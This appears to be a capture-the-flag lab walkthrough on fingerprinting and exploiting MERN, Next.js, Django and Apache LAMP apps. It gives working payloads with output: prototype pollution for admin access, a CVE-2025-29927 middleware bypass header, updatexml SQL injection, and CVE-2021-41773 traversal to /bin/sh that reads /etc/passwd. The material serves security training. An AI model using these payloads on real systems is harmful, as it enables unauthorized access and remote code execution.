
### Mern stack


MERN applications are everywhere. The stack (**MongoDB, Express.js, React, Node.js**) powers a large share of modern SaaS products, internal tools, and API backends. Express is the most-deployed Node.js web framework by a significant margin, and its minimal philosophy means developers write a lot of their own utility code. That utility code is often where the vulnerabilities live.

## Stack Identity

MERN apps are the default choice for JavaScript-only shops that want one language across the full stack. On Ubuntu, the typical deployment is Node.js from the NodeSource PPA, Express listening on port `3000` or `5000`, and MongoDB on port `27017`. A reverse proxy (usually Nginx) sits in front in production, but in misconfigured environments and internal tools, the Express process is often directly exposed.

## Fingerprinting the MERN Stack

Before touching any exploit payloads, identify what you are dealing with. Start with a header check:

Terminal

           `root@tryhackme:~# curl -I 10.48.131.195:3000/ HTTP/1.1 200 OK X-Powered-By: Express Content-Type: text/html; charset=utf-8 Content-Length: 68 ETag: W/"44-0T374IjVuBCKvVq78aQtpBIvD2A" Set-Cookie: connect.sid=s%3A2PyC5xblQ3G0ERkE60uOUddRtPs2jacn.0gAB6ByfrNg3b48tDXARTEBQG0pLlKkBofAsa69W%2FY0; Path=/; HttpOnly Date: Sun, 03 May 2026 15:00:23 GMT Connection: keep-alive Keep-Alive: timeout=5`
        

Look for these in the response:

|Signal|Value|Confidence|
|---|---|---|
|`X-Powered-By` header|`Express`|High|
|`Set-Cookie` header|`connect.sid=s%3A...`|High|
|Unhandled route response|`Cannot GET /nonexistent` (plain text)|High|
|Frontend root element|In the HTML body|Medium|

`X-Powered-By: Express` is the primary signal. Express sends this header on every response by default. It is only absent if the developer explicitly called `app.disable('x-powered-by')` or added the Helmet middleware. Most developers don't bother. Reverse proxies and PaaS platforms (Vercel, Cloudflare, Railway) often strip this header before it reaches the client. If `X-Powered-By` is absent, fall back to cookie name and unhandled-route format as secondary signals.

The `connect.sid` cookie comes from the `express-session` middleware. It is present when the app uses `express-session` with `saveUninitialized: true` (the default for many apps). With `saveUninitialized: false`, the recommended setting for login sessions, the cookie only appears after a session is created. Absence of `connect.sid` does not rule out Express.

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Note:** If `saveUninitialized: false` is configured (the default in newer express-session docs for login-only sessions), the cookie is absent on unauthenticated requests. Absence of `connect.sid` does not confirm the absence of Express.

To confirm the Express unhandled-route fingerprint, request a nonexistent path from the AttackBox terminal:

Terminal

           `root@tryhackme:~# curl http://10.48.131.195:3000/nonexistent <!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <title>Error</title> </head> <body> <pre>Cannot GET /nonexistent</pre> </body> </html>`
        

An Express app with default settings returns plain text: `Cannot GET /nonexistent`. This is distinct from Django (which shows an HTML error page), Apache (which shows a styled 403 or 404), and Next.js (which returns an HTML page with a styled error). That plain-text response is unambiguous.

## Exploiting MERN

You have confirmed the stack: Express on port `3000` with a `connect.sid` session cookie. In a pentest against a MERN application, the next step after fingerprinting is API surface enumeration. MERN apps commonly expose JSON APIs for profile updates, preferences, and user settings, and developers often write their own utility functions to apply partial updates to user objects. Those utility functions are where prototype pollution typically lives.

The app on port `3000` exposes two endpoints relevant to this task:

|Endpoint|Method|Purpose|
|---|---|---|
|`/api/user/update`|POST|Accepts JSON and merges it into the session user object|
|`/api/admin/flag`|GET|Returns a flag if the requesting user has admin access|

Start by confirming the admin route is gated. Save your session cookie first, then probe the protected endpoint by issuing the following commands:

Terminal

           `root@tryhackme:~# curl -c cookies.txt http://10.48.131.195:3000/ MERN Lab App root@tryhackme:~# curl -b cookies.txt http://10.48.131.195:3000/api/admin/flag {"error":"Not authorized"}`
        

Expected: `{"error":"Not authorized"}`. The check is working for regular session users who have `isAdmin` property.

Now look at what the update endpoint accepts under normal conditions. A legitimate client might send a name or email change:

Terminal

           `root@tryhackme:~# curl -b cookies.txt -X POST http://10.48.131.195:3000/api/user/update -H "Content-Type: application/json" -d '{"name": "Alice", "email":"alice@example.com"}' {"status":"updated"}`
        

Expected: `{"status":"updated"}`. The endpoint accepts arbitrary JSON keys and merges them into the user object with no key filtering. That merge function is the attack surface.

Every JavaScript object inherits from a shared root called `Object.prototype`. When a merge function receives `{"proto": {"isAdmin": true}}` without filtering the `proto` key, it writes `isAdmin: true` directly onto `Object.prototype`, not onto any individual user object. Every object in the Node.js process that looks up `.isAdmin` will then find `true` via the prototype chain, even if the property was never explicitly set on that object. The admin flag endpoint checks `currentUser.isAdmin` on a plain session object with no own `isAdmin` property, making it the exact target. Some hardened deployments filter `__proto__` at the input layer; in those cases, the `constructor.prototype` path (`{"constructor": {"prototype": {"isAdmin": true}}}`) reaches `Object.prototype` through a different route and can bypass those filters. You can learn more about the [Prototype Pollution](https://tryhackme.com/room/prototypepollution) room.

## Getting Admin Flag

The vulnerable merge function in the app looks like this:

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

When the payload `{"__proto__": {"isAdmin": true}}` reaches this function, it finds `__proto__` in the source keys, sees it is an object, and recurses. Inside the recursion, `target["__proto__"]` is a reference to `Object.prototype` not a regular key, so it sets `Object.prototype.isAdmin = true`. The admin route then reads `currentUser.isAdmin`, finds no own property, walks the prototype chain, and returns the flag.

```javascript
app.get('/api/admin/flag', (req, res) => {
  const currentUser = req.session.currentUser || {};
  if (currentUser.isAdmin) {               // resolves true via prototype chain
    res.json({ flag: '[REDACTED]' });
  } else {
    res.status(403).json({ error: 'Not authorized' });
  }
});
```

**Step 1: Send the Prototype Pollution Payload**

Terminal

           `root@tryhackme:~# curl -b cookies.txt -X POST http://10.48.131.195:3000/api/user/update -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}' {"status":"updated"}`
        

The server responds with `{"status":"updated"}`. The merge has run and `Object.prototype.isAdmin` is now `true` in the Node.js process.

**Step 2: Request the Admin Flag**

Terminal

           `root@tryhackme:~# curl -b cookies.txt http://10.48.131.195:3000/api/admin/flag {"flag":"[REDACTED]"}`
        

The `isAdmin` check resolves `true` via the prototype chain, and the response contains the flag.


### Next.js

## React Server Components and the Flight Protocol

The App Router runs React components directly on the server. Instead of shipping JavaScript to the browser, the server executes the component and streams the result to the client using a binary-like format called the RSC Flight protocol. That streaming channel, the endpoint that serves this payload, is the attack surface for CVE-2025-55182.

## Fingerprinting Next.js

Start with passive fingerprinting. No exploit payloads yet.

Terminal

           `root@tryhackme:~# curl -I http://10.48.131.195:3001/ HTTP/1.1 200 OK Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding x-nextjs-cache: HIT x-nextjs-prerender: 1 x-nextjs-stale-time: 4294967294 X-Powered-By: Next.js Cache-Control: s-maxage=31536000, ETag: "1pqu4ojvif3at" Content-Type: text/html; charset=utf-8 Content-Length: 4277 Connection: keep-alive Keep-Alive: timeout=5` 
        

Once done, look for the following patterns:

|Signal|Value|Confidence|
|---|---|---|
|`X-Powered-By` header|`Next.js`|High|
|HTML source|`window.__next_f`  in `script` tag|High (confirms App Router)|
|Static asset paths|`/_next/static/chunks/`|High|
|Middleware headers|`x-middleware-next` or `x-middleware-rewrite`|Medium|
|Redirect to protected route|HTTP 307 to `/login`|Medium|

`window.__next_f` in the page source is the definitive App Router indicator. It is the hydration array for React Server Component data, injected by Next.js into every App Router page's HTML output. It does not appear in Pages Router or any other framework.


## CVE-2025-29927: Middleware Bypass

In Next.js, middleware is a function that runs before every request reaches a page. Developers use it as the central gatekeeper; authentication checks, session validation, and redirect logic all live here. Because middleware sits in front of every route, it is the single most common place developers implement access control in Next.js applications.

The `/dashboard` route in this app is a typical example. The middleware checks for a valid session cookie. Without one, it redirects to `/login`. Let us confirm that it is working:

Terminal

           `root@tryhackme:~# curl -v http://10.48.131.195:3001/dashboard Trying 10.48.131.195:3001... Connected to 10.48.131.195 port 3001 GET /dashboard HTTP/1.1 Host: 10.48.131.195:3001 Accept: / /login` 
        

Middleware is working. No cookie, no dashboard, the server sends us straight to `/login`.

Now for the vulnerability. Next.js uses an internal header called `x-middleware-subrequest` to prevent infinite loops. When middleware calls itself recursively (for example, to forward a modified request to another route), Next.js attaches this header so it knows not to run middleware again on that forwarded request. It is a performance and safety mechanism built into the framework itself.

The critical flaw: Next.js never checked whether `x-middleware-subrequest` was coming from an internal process or from an external client. If you include the header in your own request, Next.js treats it the same as an internal subrequest and skips middleware entirely. The authentication check never runs.

The header value encodes the middleware module path, repeated five times. For an app with a root-level `middleware.ts` file:

Terminal

           `root@tryhackme:~# curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://10.48.131.195:3001/dashboard ... DashboardFlag: [REDACTED] ...`
        

The middleware check is bypassed entirely. The request is routed directly to the dashboard page handler, which returns the flag.

This is CVE-2025-29927, a CVSS 9.1 Critical. Every Next.js application that relied on middleware for authentication was exposed to complete authentication bypass with a single header. No credentials, no brute force, no session token, just a header value that Next.js itself trusted without validation.


### Django

[CVE-2021-35042 (opens in new tab)](https://nvd.nist.gov/vuln/detail/CVE-2021-35042) is a SQL injection vulnerability in Django's `order_by()` query method, rated **CVSS 9.8 Critical** and requiring no authentication to exploit.
#### Fingerprinting Django

Start with a header check against the running app:

Terminal

```shell-session
root@tryhackme:~# curl -I "http://10.82.95.115:8000/products/"
HTTP/1.1 200 OK
Date: Sun, 03 May 2026 14:33:20 GMT
Server: WSGIServer/0.2 CPython/3.10.12
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 407
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  csrftoken=9vMaeHlURA0uOYnP9qB2BrDNTvNPoD0JPyecxWNxV7aohswgtAtBvwbLWaOTYIF7; expires=Sun, 02 May 2027 14:33:20 GMT; Max-Age=31449600; Path=/; SameSite=Lax
```



The `csrfmiddlewaretoken` hidden field is the most reliable Django fingerprint. Django's `CsrfViewMiddleware` injects it into every `POST` form automatically. Browse to `/admin/` and view source; it is always there. You will not find this field in Express, Rails, or any Next.js application.

The combination of `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, and `Referrer-Policy: same-origin` appearing together signals Django's `SecurityMiddleware`. No other framework applies this combination by default.

```shell-session
root@tryhackme:~# curl -s "http://10.48.131.195:8000/products/"
<!DOCTYPE html>
<html>
<head><title>Products</title></head>
<body>
<h1>Products</h1>
<form method="get" action="">
  <input type="hidden" name="csrfmiddlewaretoken" value="w4VrwSsqEYpBZL4ROD1c4CgYbqw0zjZZeiXQVYGmkUjVDIce9k6wq7XvaORkbAkL">
  <input type="hidden" name="order" value="">
</form>
<ul>

  <li>Gadget B - $19.99</li>

  <li>Tool C - $4.99</li>

  <li>Widget A - $9.99</li>

</ul>
</body>
</html>
```

## CVE-2021-35042: The Vulnerability

The view that handles `/products/` builds its SQL query by concatenating the `order` parameter directly into an `ORDER BY` clause:

```python
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
)
```

Whatever you put in `?order=` lands inside the `THEN` branch of the SQL with no validation. The `CASE WHEN` structure is always true (1=1), so the `THEN` branch always executes, making it the injection entry point.

The `updatexml()` technique exploits how MySQL handles XPath errors. `updatexml(1, xpath_expr, 1)` raises an error if the XPath expression is invalid. By wrapping a `SELECT` inside the XPath argument with `concat(0x7e, ...)`, MySQL includes the query result in the error message. `0x7e` is the hex for `~`, which acts as a delimiter to make the extracted value easy to identify. Django's debug mode (DEBUG = True) surfaces these MySQL errors in the HTTP 500 response body.

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765214579)

**Warning:** The `updatexml()` technique only works when `DEBUG = True` is set in `settings.py`. A production app with `DEBUG = False` returns a generic 500 page with no error details. In this lab, the debug setting is on, but on a real engagement, verify this first. If debug output is suppressed, blind time-based injection using `SLEEP()` is the fallback.

## Exploitation Walkthrough

**Step 1: Extract MySQL Version**

Confirm the injection is working by extracting a known value: the database version. The `@@version` system variable is always available and gives you an immediate confirmation that your payload is executing. The 500 error response also reveals the Django version in its debug output:

```shell-session
root@ip-10-82-126-238:~# curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
~8.0.45-0ubuntu0.22.04.1
```

The `~` prefix confirms your payload executed and the database responded. You are injecting into MySQL 8.0. The same 500 error page also contains `Django Version: 3.2.4` in the debug output.

**Step 2: Extract the Database Name**

Now find out which database the application is using:

```shell-session
root@ip-10-82-126-238:~# curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
~vuln_db
```

### LAMP

LAMP (Linux, Apache, MySQL, PHP) is one of the earliest and most widely adopted web application stacks. It became popular because all its components are open-source, stable, and easy to deploy. Linux provides the operating system, Apache handles web requests, MySQL manages the database, and PHP processes dynamic content. For years, it powered much of the internet, including blogs, forums, and enterprise apps. Even today, many legacy systems and production environments still rely on LAMP due to its simplicity and reliability.


## Stack Identity

On Ubuntu, Apache usually runs under `www-data`, serves files from `/var/www/html,` and passes dynamic requests to PHP through `mod_php` or PHP-FPM. MySQL stores the application data, while PHP handles server-side logic. This classic Linux, Apache, MySQL, and PHP combination creates common attack surfaces such as exposed PHP files, database errors, weak file permissions, and misconfigured Apache/PHP settings.

## Fingerprinting the LAMP Stack

Start with a header check. Apache advertises its version in every response:

```shell-session
root@tryhackme:~# curl -I http://MACHINE_IP:8080/
HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)
Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
ETag: "2d-432a5e4a73a80"
Accept-Ranges: bytes
Content-Length: 45
Content-Type: text/html
```

`Server: Apache/2.4.49 (Unix)` is everything you need. This exact version maps to [CVE-2021-41773 (opens in new tab)](https://nvd.nist.gov/vuln/detail/cve-2021-41773) and nothing else. Apache also repeats the version in 404 error page footers. Request a non-existent path to confirm:

```shell-session
root@tryhackme:~# curl -v http://MACHINE_IP:8080/nonexistent 2>&1
*   Trying MACHINE_IP:8080...
* TCP_NODELAY set
* Connected to MACHINE_IP (10.82.95.115) port 8080 (#0)
> GET /nonexistent HTTP/1.1
> Host: MACHINE_IP:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Date: Sat, 02 May 2026 21:16:56 GMT
< Server: Apache/2.4.49 (Unix)
< Content-Length: 196
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
* Connection #0 to host MACHINE_IP left intact
```

The final signal is `/cgi-bin/`. A 403 Forbidden means the directory exists, and listing is disabled. `mod_cgi` is configured. A 404 would mean it is not present at all. For this exploit, `mod_cgi` is required:

```shell-session
root@tryhackme:~# curl -v http://MACHINE_IP:8080/cgi-bin/ 2>&1
*   Trying 10.82.95.115:8080...
* TCP_NODELAY set
* Connected to MACHINE_IP (10.82.95.115) port 8080 (#0)
> GET /cgi-bin/ HTTP/1.1
> Host: MACHINE_IP:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Date: Sat, 02 May 2026 21:19:21 GMT
< Server: Apache/2.4.49 (Unix)
< Content-Length: 199
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
* Connection #0 to host MACHINE_IP left intact
```

## CVE-2021-41773: The Vulnerability

Apache 2.4.49 introduced a change to the `ap_normalize_path()` function. The change inadvertently broke the path traversal filter. Normally, Apache blocks any URL containing `../` before it reaches the filesystem. The bug is in the decode order: the traversal filter runs before full URL decoding.

When you send `.%2e/` (a literal dot followed by the URL-encoded dot and a slash), the filter sees `.%2e/` and does not recognise it as `../`. When Apache passes the URL to the filesystem, the OS resolves `.%2e/` as `../`. The filter was bypassed.

On its own, this is directory traversal for file read. What makes it critical is the interaction with `mod_cgi`. The `/cgi-bin/` path has CGI execution enabled. When the traversal resolves to an executable binary like `/bin/sh`, Apache runs it as a CGI script and passes the HTTP `POST` body to its stdin.

**Why `--path-as-is` Is Required**

curl normalises URLs before sending them. Without `--path-as-is`, curl cleans up `.%2e/` sequences before the request leaves your machine, and the server receives a normal path. The flag tells curl to send the URL exactly as typed.

**Warning:** If your traversal requests return 403 instead of executing, the most common cause is a missing `--path-as-is` flag. curl silently normalises the traversal sequences, and the server never sees the encoded dots.

## Exploitation 

You have confirmed Apache 2.4.49 on port `8080`, with `mod_cgi` enabled on `/cgi-bin/`. You have a direct path to unauthenticated RCE.

**Step 1: Confirm Remote Code Execution**

Traverse from `/cgi-bin/` up to `/bin/sh` using four `.%2e/` segments. Pass shell commands in the POST body. The `echo Content-Type: text/plain; echo;` preamble is required by the CGI spec. Apache needs a valid HTTP header block before the body, or it returns a 500. The bare `echo` outputs the required blank separator line:

```shell-session
root@tryhackme:~# curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; id'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

RCE confirmed. The Apache process is running as `daemon`. You have code execution on the server with the privileges of the web process.

**Step 2: Read System Accounts**

With code execution, you can read any file the `daemon` user can access. Read `/etc/passwd` to enumerate system accounts inside the container:

```shell-session
root@tryhackme:~# curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

## CVE Summary

| Stack              | CVE            | Impact                                       | CVSS         |
| ------------------ | -------------- | -------------------------------------------- | ------------ |
| MERN / Express     | CVE-2020-8203  | Prototype pollution → auth bypass            | 7.4 High     |
| Next.js Middleware | CVE-2025-29927 | Single header → full middleware bypass       | 9.1 Critical |
| Django ORM         | CVE-2021-35042 | SQL injection via unparameterised `ORDER BY` | 9.8 Critical |
| Apache LAMP        | CVE-2021-41773 | Path traversal + `mod_cgi` RCE               | 9.8 Critical |
Tools like Nikto give us a quick first pass.

```shell-session
root@tryhackme:~# nikto -h http://10.48.153.192:3000

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.153.192
+ Target Hostname:    10.48.153.192
+ Target Port:        3000
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Cookie connect.sid created without the httponly flag
+ Retrieved x-powered-by header: Express
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'content-security-policy' found, with contents: default-src 'none'
+ Allowed HTTP Methods: GET, HEAD
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested
```

